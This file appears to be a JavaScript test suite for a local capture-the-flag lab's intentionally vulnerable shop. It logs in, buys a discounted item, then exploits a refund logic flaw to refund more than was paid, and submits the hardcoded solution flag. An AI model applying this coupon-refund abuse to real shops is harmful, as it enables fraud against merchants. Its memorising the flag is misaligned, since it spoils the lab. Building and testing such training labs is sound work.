const http = require('http');

const BASE = 'http://localhost:3015';

async function testFlow() {
  console.log('🧪 Lab 5 Test Suite\n');

  try {
    // Test 1: Login
    console.log('1️⃣  Testing Login...');
    let loginResp = await post('/api/login', { username: 'attacker1', password: 'ShopHack123!' });
    let token = loginResp.token;
    console.log('   ✓ Login successful');

    // Test 2: Coupon blocked on premium item
    console.log('2️⃣  Testing Premium Item (Secret Item)...');
    try {
      await post('/api/checkout/preview', { productId: 999, couponCode: 'MEGA80' }, token);
      throw new Error('Should have blocked coupon on premium item');
    } catch (e) {
      if (e.message.includes('Premium items')) {
        console.log(`   ✓ Coupon correctly blocked: "${e.message}"`);
      } else {
        throw e;
      }
    }

    // Test 3: Coupon works on regular item
    console.log('3️⃣  Testing Coupon on Regular Item...');
    let preview = await post('/api/checkout/preview', { productId: 101, couponCode: 'MEGA80' }, token);
    console.log(`   ✓ Coupon works: Original $${preview.originalPrice} → Paid $${preview.paidAmount}`);

    // Test 4: Purchase regular item with coupon
    console.log('4️⃣  Testing Purchase with Coupon...');
    let purchase = await post('/api/orders/purchase', { productId: 101, couponCode: 'MEGA80' }, token);
    console.log(`   ✓ Order #${purchase.orderId} placed, Balance: $${purchase.balance}`);

    // Test 5: Refund (exploit test)
    console.log('5️⃣  Testing Refund (Exploit)...');
    let refund = await post(`/api/orders/${purchase.orderId}/return`, {}, token);
    console.log(`   ✓ Refunded $${refund.refundAmount} (profit!)`);

    // Test 6: Now try to buy Secret Item without coupon
    console.log('6️⃣  Testing Secret Item Purchase (no coupon)...');
    try {
      let secretPreview = await post('/api/checkout/preview', { productId: 999 }, token);
      console.log(`   Price: $${secretPreview.paidAmount}`);
    } catch (e) {
      console.log(`   Error: ${e.message}`);
    }

    // Test 7: Flag submission
    console.log('7️⃣  Testing Flag Submit (correct)...');
    let flagResp = await post('/api/challenge/submit-flag', { flag: 'FLAG{logic_err0r_c0upon_abus3}' }, token);
    console.log(`   ✓ Flag accepted`);

    console.log('\n✅ All tests passed!');
  } catch (e) {
    console.error(`\n❌ Test failed: ${e.message}`);
    process.exit(1);
  }
}

function post(path, body, tok) {
  return new Promise((resolve, reject) => {
    const data = JSON.stringify(body);
    const options = {
      hostname: 'localhost',
      port: 3015,
      path,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': data.length
      }
    };
    if (tok) options.headers.Authorization = `Bearer ${tok}`;

    const req = http.request(options, (res) => {
      let body = '';
      res.on('data', d => body += d);
      res.on('end', () => {
        try {
          const parsed = JSON.parse(body);
          if (res.statusCode >= 400) reject(new Error(parsed.message || `HTTP ${res.statusCode}`));
          else resolve(parsed);
        } catch (e) {
          reject(e);
        }
      });
    });
    req.on('error', reject);
    req.write(data);
    req.end();
  });
}

function get(path, tok) {
  return new Promise((resolve, reject) => {
    const options = {
      hostname: 'localhost',
      port: 3015,
      path,
      method: 'GET',
      headers: {}
    };
    if (tok) options.headers.Authorization = `Bearer ${tok}`;

    const req = http.request(options, (res) => {
      let body = '';
      res.on('data', d => body += d);
      res.on('end', () => {
        try {
          resolve(JSON.parse(body));
        } catch (e) {
          reject(e);
        }
      });
    });
    req.on('error', reject);
    req.end();
  });
}

testFlow();
